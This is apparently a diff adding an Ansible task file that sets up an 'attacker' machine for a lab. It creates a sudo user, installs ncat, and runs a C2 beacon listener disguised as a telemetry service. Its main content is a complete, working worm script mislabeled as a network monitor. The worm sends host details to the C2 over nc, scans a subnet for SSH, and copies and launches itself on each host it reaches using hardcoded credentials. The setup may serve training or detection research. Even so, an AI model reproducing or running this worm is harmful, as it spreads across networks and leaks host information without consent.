@@ -1,0 +1,121 @@
+---
+- name: Add attacker user
+  user:
+    name: '{{ username }}'
+    password: '{{ password | password_hash("sha512") }}'
+    shell: /bin/bash
+    groups: sudo
+    append: yes
+
+- name: Add host aliases
+  lineinfile:
+    path: /etc/hosts
+    line: "{{ item.ip }} {{ item.name }}"
+    state: present
+  loop: "{{ hosts_entries }}"
+
+- name: Install ncat
+  apt:
+    name: ncat
+    state: present
+    update_cache: yes
+
+- name: Create C2 log directory
+  file:
+    path: /var/log/worm-c2
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+
+
+
+- name: Ensure /opt/worm-source/ exists
+  file: 
+    path: /opt/worm-source
+    state: directory
+    owner: root
+    group: root
+    mode: "0755"
+
+- name: Keep original worm source on attacker
+  copy:
+    dest: /opt/worm-source/worm.sh
+    owner: root
+    group: root
+    mode: "0700"
+    content: |
+      #!/bin/bash
+      # sysnet-core v2.1 — System Network Core Monitor
+      # Internal use only
+      SELF="$(readlink -f "$0")"
+      WORM_DIR="/opt/.worm"
+      SPREAD_LOG="$WORM_DIR/spread.log"
+      BEACON_LOG="$WORM_DIR/beacon.log"
+      C2_HOST="attacker"
+      C2_PORT="{{ beacon_port }}"
+      CRED_USER="labuser"
+      CRED_PASS="labpass"
+      SUBNET="192.168.90"
+
+      send_beacon() {
+        {
+          echo "=== BEACON $(date -Is) ==="
+          echo "host=$(hostname)"
+          echo "ip=$(hostname -I | awk '{print $1}')"
+          echo "user=$(whoami)"
+          echo "uptime=$(uptime -p)"
+          echo "procs=$(ps aux | wc -l)"
+        } | nc -w 5 "$C2_HOST" "$C2_PORT" 2>/dev/null || true
+        echo "$(date -Is) beacon_sent host=$(hostname)" >> "$BEACON_LOG"
+      }
+
+      try_spread() {
+        local target="$1"
+        sshpass -p "$CRED_PASS" ssh -o StrictHostKeyChecking=no           -o ConnectTimeout=3 -o BatchMode=no           "$CRED_USER@$target"           "mkdir -p $WORM_DIR && cat > $WORM_DIR/worm.sh && chmod +x $WORM_DIR/worm.sh"           < "$SELF" 2>/dev/null || return 1
+        sshpass -p "$CRED_PASS" ssh -o StrictHostKeyChecking=no           -o ConnectTimeout=3 -o BatchMode=no           "$CRED_USER@$target"           "nohup $WORM_DIR/worm.sh >/dev/null 2>&1 &" 2>/dev/null || true
+        echo "$(date -Is) SPREAD_OK target=$target" >> "$SPREAD_LOG"
+      }
+
+      scan_and_spread() {
+        local MY_IP
+        MY_IP=$(hostname -I | awk '{print $1}')
+        for last in $(seq 1 254); do
+          local target="${SUBNET}.${last}"
+          [ "$target" = "$MY_IP" ] && continue
+          nc -z -w 1 "$target" 22 2>/dev/null || continue
+          grep -q "SPREAD_OK target=$target" "$SPREAD_LOG" 2>/dev/null && continue
+          try_spread "$target"
+        done
+      }
+
+      mkdir -p "$WORM_DIR"
+      send_beacon
+      scan_and_spread
+
+- name: Create beacon receiver systemd service
+  copy:
+    dest: /etc/systemd/system/worm-beacon-rcv.service
+    owner: root
+    group: root
+    mode: "0644"
+    content: |
+      [Unit]
+      Description=System Network Telemetry Collector
+      After=network.target
+
+      [Service]
+      Type=simple
+      ExecStart=/bin/sh -c 'ncat -lk {{ beacon_port }} >> /var/log/worm-c2/beacons.log 2>&1'
+      Restart=always
+      RestartSec=2
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: Enable and start beacon receiver
+  systemd:
+    name: worm-beacon-rcv.service
+    enabled: yes
+    state: started
+    daemon_reload: yes
